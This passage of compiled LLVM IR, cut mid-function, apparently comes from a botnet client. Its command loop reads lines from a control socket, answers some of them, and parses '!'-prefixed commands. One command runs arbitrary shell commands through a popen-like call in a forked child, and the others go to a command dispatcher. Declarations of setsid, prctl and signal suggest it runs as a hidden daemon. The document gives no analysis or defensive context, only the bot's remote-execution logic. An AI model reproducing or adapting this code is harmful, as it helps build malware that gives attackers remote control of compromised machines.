  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %92 = call i32 @recvLine(i32 noundef %90, i8* noundef %91, i32 noundef 4096)
  store i32 %92, i32* %11, align 4
  %93 = icmp ne i32 %92, -1
  br i1 %93, label %94, label %373

94:                                               ; preds = %89
  store i32 0, i32* %12, align 4
  br label %95

95:                                               ; preds = %166, %94
  %96 = load i32, i32* %12, align 4
  %97 = sext i32 %96 to i64
  %98 = load i64, i64* @numpids, align 8
  %99 = icmp ult i64 %97, %98
  br i1 %99, label %100, label %169

100:                                              ; preds = %95
  %101 = load i32*, i32** @pids, align 8
  %102 = load i32, i32* %12, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %101, i64 %103
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @waitpid(i32 noundef %105, i32* noundef null, i32 noundef 1)
  %107 = icmp sgt i32 %106, 0
  br i1 %107, label %108, label %165

108:                                              ; preds = %100
  %109 = load i32, i32* %12, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %14, align 4
  br label %111

111:                                              ; preds = %127, %108
  %112 = load i32, i32* %14, align 4
  %113 = zext i32 %112 to i64
  %114 = load i64, i64* @numpids, align 8
  %115 = icmp ult i64 %113, %114
  br i1 %115, label %116, label %130

116:                                              ; preds = %111
  %117 = load i32*, i32** @pids, align 8
  %118 = load i32, i32* %14, align 4
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds i32, i32* %117, i64 %119
  %121 = load i32, i32* %120, align 4
  %122 = load i32*, i32** @pids, align 8
  %123 = load i32, i32* %14, align 4
  %124 = sub i32 %123, 1
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %122, i64 %125
  store i32 %121, i32* %126, align 4
  br label %127

127:                                              ; preds = %116
  %128 = load i32, i32* %14, align 4
  %129 = add i32 %128, 1
  store i32 %129, i32* %14, align 4
  br label %111, !llvm.loop !69

130:                                              ; preds = %111
  %131 = load i32*, i32** @pids, align 8
  %132 = load i32, i32* %14, align 4
  %133 = sub i32 %132, 1
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %131, i64 %134
  store i32 0, i32* %135, align 4
  %136 = load i64, i64* @numpids, align 8
  %137 = add i64 %136, -1
  store i64 %137, i64* @numpids, align 8
  %138 = load i64, i64* @numpids, align 8
  %139 = add i64 %138, 1
  %140 = mul i64 %139, 4
  %141 = call noalias i8* @malloc(i64 noundef %140) #12
  %142 = bitcast i8* %141 to i32*
  store i32* %142, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %143

143:                                              ; preds = %158, %130
  %144 = load i32, i32* %14, align 4
  %145 = zext i32 %144 to i64
  %146 = load i64, i64* @numpids, align 8
  %147 = icmp ult i64 %145, %146
  br i1 %147, label %148, label %161

148:                                              ; preds = %143
  %149 = load i32*, i32** @pids, align 8
  %150 = load i32, i32* %14, align 4
  %151 = zext i32 %150 to i64
  %152 = getelementptr inbounds i32, i32* %149, i64 %151
  %153 = load i32, i32* %152, align 4
  %154 = load i32*, i32** %13, align 8
  %155 = load i32, i32* %14, align 4
  %156 = zext i32 %155 to i64
  %157 = getelementptr inbounds i32, i32* %154, i64 %156
  store i32 %153, i32* %157, align 4
  br label %158

158:                                              ; preds = %148
  %159 = load i32, i32* %14, align 4
  %160 = add i32 %159, 1
  store i32 %160, i32* %14, align 4
  br label %143, !llvm.loop !70

161:                                              ; preds = %143
  %162 = load i32*, i32** @pids, align 8
  %163 = bitcast i32* %162 to i8*
  call void @free(i8* noundef %163) #12
  %164 = load i32*, i32** %13, align 8
  store i32* %164, i32** @pids, align 8
  br label %165

165:                                              ; preds = %161, %100
  br label %166

166:                                              ; preds = %165
  %167 = load i32, i32* %12, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %12, align 4
  br label %95, !llvm.loop !71

169:                                              ; preds = %95
  %170 = load i32, i32* %11, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %171
  store i8 0, i8* %172, align 1
  %173 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  call void @trim(i8* noundef %173)
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %175 = call i8* @strstr(i8* noundef %174, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i64 0, i64 0)) #11
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %177 = icmp eq i8* %175, %176
  br i1 %177, label %178, label %181

178:                                              ; preds = %169
  %179 = load i32, i32* @mainCommSock, align 4
  %180 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %179, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i64 0, i64 0))
  br label %89, !llvm.loop !72

181:                                              ; preds = %169
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %183 = call i8* @strstr(i8* noundef %182, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i64 0, i64 0)) #11
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %185 = icmp eq i8* %183, %184
  br i1 %185, label %186, label %187

186:                                              ; preds = %181
  call void @exit(i32 noundef 0) #16
  unreachable

187:                                              ; preds = %181
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  store i8* %188, i8** %15, align 8
  %189 = load i8*, i8** %15, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 33
  br i1 %192, label %193, label %372

193:                                              ; preds = %187
  %194 = load i8*, i8** %15, align 8
  %195 = getelementptr inbounds i8, i8* %194, i64 1
  store i8* %195, i8** %16, align 8
  br label %196

196:                                              ; preds = %208, %193
  %197 = load i8*, i8** %16, align 8
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp ne i32 %199, 32
  br i1 %200, label %201, label %206

201:                                              ; preds = %196
  %202 = load i8*, i8** %16, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp ne i32 %204, 0
  br label %206

206:                                              ; preds = %201, %196
  %207 = phi i1 [ false, %196 ], [ %205, %201 ]
  br i1 %207, label %208, label %211

208:                                              ; preds = %206
  %209 = load i8*, i8** %16, align 8
  %210 = getelementptr inbounds i8, i8* %209, i32 1
  store i8* %210, i8** %16, align 8
  br label %196, !llvm.loop !73

211:                                              ; preds = %206
  %212 = load i8*, i8** %16, align 8
  %213 = load i8, i8* %212, align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 0
  br i1 %215, label %216, label %217

216:                                              ; preds = %211
  br label %89, !llvm.loop !72

217:                                              ; preds = %211
  %218 = load i8*, i8** %16, align 8
  store i8 0, i8* %218, align 1
  %219 = load i8*, i8** %15, align 8
  %220 = getelementptr inbounds i8, i8* %219, i64 1
  store i8* %220, i8** %16, align 8
  %221 = load i8*, i8** %15, align 8
  %222 = load i8*, i8** %16, align 8
  %223 = call i64 @strlen(i8* noundef %222) #11
  %224 = getelementptr inbounds i8, i8* %221, i64 %223
  %225 = getelementptr inbounds i8, i8* %224, i64 2
  store i8* %225, i8** %15, align 8
  br label %226

226:                                              ; preds = %246, %217
  %227 = load i8*, i8** %15, align 8
  %228 = load i8*, i8** %15, align 8
  %229 = call i64 @strlen(i8* noundef %228) #11
  %230 = sub i64 %229, 1
  %231 = getelementptr inbounds i8, i8* %227, i64 %230
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 10
  br i1 %234, label %244, label %235

235:                                              ; preds = %226
  %236 = load i8*, i8** %15, align 8
  %237 = load i8*, i8** %15, align 8
  %238 = call i64 @strlen(i8* noundef %237) #11
  %239 = sub i64 %238, 1
  %240 = getelementptr inbounds i8, i8* %236, i64 %239
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 13
  br label %244

244:                                              ; preds = %235, %226
  %245 = phi i1 [ true, %226 ], [ %243, %235 ]
  br i1 %245, label %246, label %252

246:                                              ; preds = %244
  %247 = load i8*, i8** %15, align 8
  %248 = load i8*, i8** %15, align 8
  %249 = call i64 @strlen(i8* noundef %248) #11
  %250 = sub i64 %249, 1
  %251 = getelementptr inbounds i8, i8* %247, i64 %250
  store i8 0, i8* %251, align 1
  br label %226, !llvm.loop !74

252:                                              ; preds = %244
  %253 = load i8*, i8** %15, align 8
  store i8* %253, i8** %17, align 8
  br label %254

254:                                              ; preds = %266, %252
  %255 = load i8*, i8** %15, align 8
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp ne i32 %257, 32
  br i1 %258, label %259, label %264

259:                                              ; preds = %254
  %260 = load i8*, i8** %15, align 8
  %261 = load i8, i8* %260, align 1
  %262 = zext i8 %261 to i32
  %263 = icmp ne i32 %262, 0
  br label %264

264:                                              ; preds = %259, %254
  %265 = phi i1 [ false, %254 ], [ %263, %259 ]
  br i1 %265, label %266, label %269

266:                                              ; preds = %264
  %267 = load i8*, i8** %15, align 8
  %268 = getelementptr inbounds i8, i8* %267, i32 1
  store i8* %268, i8** %15, align 8
  br label %254, !llvm.loop !75

269:                                              ; preds = %264
  %270 = load i8*, i8** %15, align 8
  store i8 0, i8* %270, align 1
  %271 = load i8*, i8** %15, align 8
  %272 = getelementptr inbounds i8, i8* %271, i32 1
  store i8* %272, i8** %15, align 8
  %273 = load i8*, i8** %17, align 8
  store i8* %273, i8** %18, align 8
  br label %274

274:                                              ; preds = %278, %269
  %275 = load i8*, i8** %18, align 8
  %276 = load i8, i8* %275, align 1
  %277 = icmp ne i8 %276, 0
  br i1 %277, label %278, label %287

278:                                              ; preds = %274
  %279 = load i8*, i8** %18, align 8
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = call i32 @toupper(i32 noundef %281) #11
  %283 = trunc i32 %282 to i8
  %284 = load i8*, i8** %18, align 8
  store i8 %283, i8* %284, align 1
  %285 = load i8*, i8** %18, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %18, align 8
  br label %274, !llvm.loop !76

287:                                              ; preds = %274
  %288 = load i8*, i8** %17, align 8
  %289 = call i32 @strcmp(i8* noundef %288, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.108, i64 0, i64 0)) #11
  %290 = icmp eq i32 %289, 0
  br i1 %290, label %291, label %314

291:                                              ; preds = %287
  %292 = call i32 @listFork()
  %293 = icmp ne i32 %292, 0
  br i1 %293, label %294, label %295

294:                                              ; preds = %291
  br label %89, !llvm.loop !72

295:                                              ; preds = %291
  %296 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %296, i8 0, i64 1024, i1 false)
  %297 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %298 = load i8*, i8** %15, align 8
  %299 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %297, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i64 0, i64 0), i8* noundef %298)
  %300 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %301 = call i32 @fdpopen(i8* noundef %300, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i64 0, i64 0))
  store i32 %301, i32* %20, align 4
  br label %302

302:                                              ; preds = %307, %295
  %303 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %304 = load i32, i32* %20, align 4
  %305 = call i8* @fdgets(i8* noundef %303, i32 noundef 1024, i32 noundef %304)
  %306 = icmp ne i8* %305, null
  br i1 %306, label %307, label %311

307:                                              ; preds = %302
  %308 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @trim(i8* noundef %308)
  %309 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %309, i8 0, i64 1024, i1 false)
  %310 = call i32 @sleep(i32 noundef 1)
  br label %302, !llvm.loop !77

311:                                              ; preds = %302
  %312 = load i32, i32* %20, align 4
  %313 = call i32 @fdpclose(i32 noundef %312)
  call void @exit(i32 noundef 0) #16
  unreachable

314:                                              ; preds = %287
  store i32 1, i32* %22, align 4
  %315 = load i8*, i8** %15, align 8
  %316 = call i8* @strtok(i8* noundef %315, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i64 0, i64 0)) #12
  store i8* %316, i8** %23, align 8
  %317 = load i8*, i8** %17, align 8
  %318 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %317, i8** %318, align 16
  br label %319

319:                                              ; preds = %350, %314
  %320 = load i8*, i8** %23, align 8
  %321 = icmp ne i8* %320, null
  br i1 %321, label %322, label %352

322:                                              ; preds = %319
  %323 = load i8*, i8** %23, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp ne i32 %325, 10
  br i1 %326, label %327, label %350

327:                                              ; preds = %322
  %328 = load i8*, i8** %23, align 8
  %329 = call i64 @strlen(i8* noundef %328) #11
  %330 = add i64 %329, 1
  %331 = call noalias i8* @malloc(i64 noundef %330) #12
  %332 = load i32, i32* %22, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %333
  store i8* %331, i8** %334, align 8
  %335 = load i32, i32* %22, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %336
  %338 = load i8*, i8** %337, align 8
  %339 = load i8*, i8** %23, align 8
  %340 = call i64 @strlen(i8* noundef %339) #11
  %341 = add i64 %340, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %338, i8 0, i64 %341, i1 false)
  %342 = load i32, i32* %22, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %343
  %345 = load i8*, i8** %344, align 8
  %346 = load i8*, i8** %23, align 8
  %347 = call i8* @strcpy(i8* noundef %345, i8* noundef %346) #12
  %348 = load i32, i32* %22, align 4
  %349 = add nsw i32 %348, 1
  store i32 %349, i32* %22, align 4
  br label %350

350:                                              ; preds = %327, %322
  %351 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i64 0, i64 0)) #12
  store i8* %351, i8** %23, align 8
  br label %319, !llvm.loop !78

352:                                              ; preds = %319
  %353 = load i32, i32* %22, align 4
  %354 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  call void @processCmd(i32 noundef %353, i8** noundef %354)
  %355 = load i32, i32* %22, align 4
  %356 = icmp sgt i32 %355, 1
  br i1 %356, label %357, label %371

357:                                              ; preds = %352
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %358

358:                                              ; preds = %367, %357
  %359 = load i32, i32* %24, align 4
  %360 = load i32, i32* %22, align 4
  %361 = icmp slt i32 %359, %360
  br i1 %361, label %362, label %370

362:                                              ; preds = %358
  %363 = load i32, i32* %24, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  call void @free(i8* noundef %366) #12
  br label %367

367:                                              ; preds = %362
  %368 = load i32, i32* %24, align 4
  %369 = add nsw i32 %368, 1
  store i32 %369, i32* %24, align 4
  br label %358, !llvm.loop !79

370:                                              ; preds = %358
  br label %371

371:                                              ; preds = %370, %352
  br label %372

372:                                              ; preds = %371, %187
  br label %89, !llvm.loop !72

373:                                              ; preds = %89
  br label %80
}

; Function Attrs: nounwind
declare i32 @access(i8* noundef, i32 noundef) #4

declare i32 @printf(i8* noundef, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8* noundef, i8* noundef, i64 noundef) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8* noundef) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #4

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nofree nosync nounwind willreturn }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
!67 = distinct !{!67, !7}
!68 = distinct !{!68, !7}
!69 = distinct !{!69, !7}
!70 = distinct !{!70, !7}
!71 = distinct !{!71, !7}
!72 = distinct !{!72, !7}
!73 = distinct !{!73, !7}
!74 = distinct !{!74, !7}
!75 = distinct !{!75, !7}
!76 = distinct !{!76, !7}
!77 = distinct !{!77, !7}
!78 = distinct !{!78, !7}
!79 = distinct !{!79, !7}
